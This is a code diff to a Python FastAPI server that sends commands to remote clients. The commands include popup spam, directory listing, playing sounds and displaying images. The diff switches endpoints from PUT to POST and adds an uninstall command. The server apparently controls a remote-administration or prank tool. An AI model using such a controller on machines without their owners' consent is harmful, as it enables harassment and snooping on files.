@@ -28,7 +28,7 @@ def make_command_request(request: SendCommandRequest) -> SendCommandResponse:
     return server.handle_send_command(request)
 
 
-@app.put("/popup")
+@app.post("/popup")
 def send_popup_command(client_id: str, message: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
@@ -47,7 +47,7 @@ def send_popup_command(client_id: str, message: str) -> BasicResponse:
     )
 
 
-@app.put("/popup-spam")
+@app.post("/popup-spam")
 def send_popup_spam_command(client_id: str, message: str) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
@@ -134,7 +134,7 @@ def send_dirlist_command(client_id: str, path: str, tree: bool = True, depth: Op
     )
 
 
-@app.put("/play-sound")
+@app.post("/play-sound")
 def send_play_sound_command(client_id: str, sound_buffer: UploadFile = File(...)) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
@@ -151,7 +151,7 @@ def send_play_sound_command(client_id: str, sound_buffer: UploadFile = File(...)
     )
 
 
-@app.put("/display-image")
+@app.post("/display-image")
 def send_display_image_command(client_id: str, image_buffer: UploadFile = File(...)) -> BasicResponse:
     return make_command_request(
         SendCommandRequest(
@@ -164,6 +164,19 @@ def send_display_image_command(client_id: str, image_buffer: UploadFile = File(.
                     image_buffer=base64.b64encode(image_buffer.file.read())
                 )
             ))
+        )
+    )
+
+
+@app.post("/uninstall")
+def send_uninstall_command(client_id: str) -> BasicResponse:
+    return make_command_request(
+        SendCommandRequest(
+            header=RequestHeader(
+                client_id=client_id,
+                request_type=RequestType.SendCommand
+            ),
+            content=SendCommandContent(command=BasicCommand(command_type=CommandType.Uninstall))
         )
     )
 
